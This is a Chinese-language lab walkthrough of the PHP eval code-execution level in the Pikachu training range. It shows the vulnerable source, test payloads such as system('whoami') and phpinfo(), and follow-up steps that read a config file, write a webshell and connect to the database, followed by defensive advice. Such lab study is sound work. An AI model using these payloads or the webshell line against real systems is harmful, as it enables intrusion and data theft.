# RCE exec "eval" 通关笔记

> 上一关是"命令执行"，这一关是"代码执行"。
>
> 区别在于：**上一关执行的是系统命令，这一关执行的是 PHP 代码。**

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | RCE → exec "evel" |
| 页面地址 | `http://pikachu/vul/rce/rce_eval.php` |
| 提交方式 | POST |
| 参数名 | `txt` |
| 目标 | 在服务器上执行任意 PHP 代码 |

页面提示：

> Here, 请提交一个你喜欢的字符串

**看起来人畜无害，但它会把你输入的东西当 PHP 代码执行。**

---

## 二、我的解题步骤

### 步骤 1：先随便输点什么

输入 `hello`，点提交。

页面显示：

```
你喜欢的字符还挺奇怪的!
```

**这个提示有点怪。** 正常的"字符串处理"不会说"奇怪"。

### 步骤 2：看源码

```php
$html='';
if(isset($_POST['submit']) && $_POST['txt'] != null){
    if(@!eval($_POST['txt'])){
        $html.="<p>你喜欢的字符还挺奇怪的!</p>";
    }
}
```

**`eval($_POST['txt'])`** —— 你的输入被当成 PHP 代码执行了。

`@` 是错误抑制符，`!` 取反——所以不管执行结果如何，都会显示那句提示。

### 步骤 3：试试输 PHP 代码

输入：

```php
echo 'RCE_OK';
```

提交。

**页面上出现了 `RCE_OK`。**

我实测：

| 输入 | 页面 |
| --- | --- |
| `hello` | 只有"你喜欢的字符还挺奇怪的!" |
| `echo 'RCE_OK';` | **多出了 `RCE_OK`** |

> 注意：`echo 'RCE_OK';` 后面要加分号，因为 `eval` 里是完整的 PHP 语句。

### 步骤 4：执行系统命令

```php
system('whoami');
```

或者：

```php
echo shell_exec('whoami');
```

**页面直接输出当前用户名。**

### 步骤 5：看更多信息

```php
phpinfo();
```

页面会输出完整的 PHP 配置信息——版本、扩展、路径、环境变量。

**信息量巨大，是后续利用的基础。**

---

## 三、原理分析

### 3.1 源码

```php
if(isset($_POST['submit']) && $_POST['txt'] != null){
    if(@!eval($_POST['txt'])){
        $html.="<p>你喜欢的字符还挺奇怪的!</p>";
    }
}
```

### 3.2 `eval()` 是什么

```php
eval(string $code): mixed
```

**把字符串当作 PHP 代码执行。**

它的行为和直接写代码完全一样——**在同一个作用域、同一个权限下运行。**

| 函数 | 执行内容 |
| --- | --- |
| `eval()` | **PHP 代码** |
| `system()` / `exec()` | 系统命令 |
| `include()` | 文件内容（PHP 代码会被执行） |

### 3.3 为什么 `eval` 比命令执行更危险

因为 `eval` 能做的事**比系统命令更多**：

| 能力 | eval | system |
| --- | --- | --- |
| 执行系统命令 | ✅（调 system） | ✅ |
| 读写文件 | ✅ | ✅（用 shell） |
| 连数据库 | ✅ | ❌（要外部工具） |
| 操作 PHP 变量 | ✅ | ❌ |
| 调用任意 PHP 函数 | ✅ | ❌ |

**`eval` 是"在 PHP 内部"执行，权限和程序本身完全一样。**

### 3.4 为什么那句提示是干扰项

```php
if(@!eval($_POST['txt'])){
    $html.="<p>你喜欢的字符还挺奇怪的!</p>";
}
```

- `eval()` 本身就**不返回有意义的值**（成功返回 null）
- `@!eval(...)` → `!null` → `true`
- **所以不管你有没有执行成功，都会显示这句提示**

**作者故意用这个来干扰判断——别被它骗了，看页面有没有回显才是关键。**

---

## 四、知识点与笔记

### 4.1 代码执行漏洞的判断

| 输入 | 现象 |
| --- | --- |
| `hello` | 提示"奇怪"（说明输入被当成代码了，只是语法错误） |
| `echo 'x';` | 页面多出 `x` |
| `phpinfo();` | 输出大量配置信息 |

**最快的验证：`echo 'TEST';`**

### 4.2 eval 的语法要求

| 要点 | 说明 |
| --- | --- |
| 要加分号 | `echo 'x';` ✅ / `echo 'x'` ❌ |
| 可以是多条语句 | `echo 1; echo 2;` |
| 不需要 `<?php` | `eval` 里不要标签 |

### 4.3 常见的代码执行函数

| 函数 | 说明 |
| --- | --- |
| `eval()` | 语言结构，不是函数 |
| `assert()` | PHP 8 之前能执行字符串 |
| `create_function()` | PHP 8 移除 |
| `preg_replace()` + `/e` | PHP 7 移除 |
| `call_user_func()` | 配合可控函数名 |

### 4.4 拿到 eval 之后做什么

```php
// 看版本
phpinfo();

// 执行命令
system('whoami');

// 读文件
echo file_get_contents('D:/Pikachu/inc/config.inc.php');

// 写 webshell
file_put_contents('shell.php', '<?php eval($_POST[1]);?>');

// 连数据库
$m = new mysqli('127.0.0.1','root','rootroot','pikachu');
```

**`eval` 相当于一个"PHP 解释器"——你想干什么都行。**

---

## 五、和上一关的区别

| | exec "ping" | exec "eval" |
| --- | --- | --- |
| 执行的东西 | **系统命令** | **PHP 代码** |
| 危险函数 | `shell_exec()` | `eval()` |
| 能力范围 | 操作系统层 | **PHP 层（更大）** |
| 判断 payload | `\| whoami` | `echo 'x';` |

**一个在"系统"里执行，一个在"程序"里执行。**

---

## 六、防御怎么写

### 6.1 不要用 eval

**这是最直接的答案。**

生产代码里几乎没有任何正当理由使用 `eval()`：

| 误用场景 | 正确做法 |
| --- | --- |
| 动态计算 | 用数组 / 工厂模式 |
| 模板渲染 | 用模板引擎（会自己做转义） |
| 配置解析 | 用 JSON / YAML |

### 6.2 如果非用不可

| 措施 | 说明 |
| --- | --- |
| 白名单 | 只允许预定义的表达式 |
| 沙箱 | 用独立的解析器，不用 eval |
| 权限隔离 | 独立进程 + 低权限 |

### 6.3 禁用危险函数

```ini
disable_functions = eval,system,exec,shell_exec,passthru
```

> 注意：`eval` 是语言结构，**`disable_functions` 对 `eval` 无效**，需要用扩展（如 Suhosin）或代码审查。

### 6.4 输入校验（辅助）

```php
if (!preg_match('/^[a-zA-Z0-9_\-\s]+$/', $input)) {
    exit('非法输入');
}
```

**能挡住大部分，但不是根治。**

---

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 代码执行漏洞 |
| 关键函数 | `eval()` |
| 判断 | 输入 `echo 'x';` 看回显 |
| 实测 | `echo 'RCE_OK';` → 页面出现 `RCE_OK` |
| 修复 | **不要用 eval** |

**一句话**：

> **`eval()` 是"把用户的话当圣旨"——他说什么，PHP 就执行什么。**

---

## 参考

- [OWASP: Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [PHP: eval](https://www.php.net/manual/zh/function.eval.php)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
